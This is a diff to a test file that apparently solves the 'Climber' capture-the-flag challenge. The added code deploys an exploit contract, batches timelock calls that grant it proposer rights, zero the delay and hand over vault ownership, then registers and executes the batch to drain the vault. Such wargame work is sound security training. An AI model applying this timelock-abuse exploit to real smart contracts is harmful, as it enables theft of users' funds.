@@ -58,6 +58,41 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let targets = [];
+        let values = [];
+        let dataElements = [];
+        let salt = ethers.utils.randomBytes(32);
+
+
+        let exploit = await (await ethers.getContractFactory('contracts/climber/Exploit.sol:Exploit', player)).deploy(
+            timelock.address,
+            vault.address,
+            player.address,
+            token.address
+        );
+
+        // 1. grantRole(PROPOSER_ROLE, exploit.address)
+        targets.push(timelock.address);
+        values.push(0);
+        dataElements.push(timelock.interface.encodeFunctionData("grantRole", [ethers.utils.id("PROPOSER_ROLE"), exploit.address]));
+
+        // 2. updateDelay(0)
+        targets.push(timelock.address)
+        values.push(0);
+        dataElements.push(timelock.interface.encodeFunctionData("updateDelay", [0]));
+
+        // 4. vault.transferOwnership(exploit.address)
+        targets.push(vault.address);
+        values.push(0);
+        dataElements.push(vault.interface.encodeFunctionData("transferOwnership", [exploit.address]));
+
+        // 5. exploit.exploit()
+        targets.push(exploit.address);
+        values.push(0);
+        dataElements.push(exploit.interface.encodeFunctionData("exploit"));
+
+        await exploit.register(targets, values, dataElements, salt);
+        await timelock.execute(targets, values, dataElements, salt);
     });
 
     after(async function () {
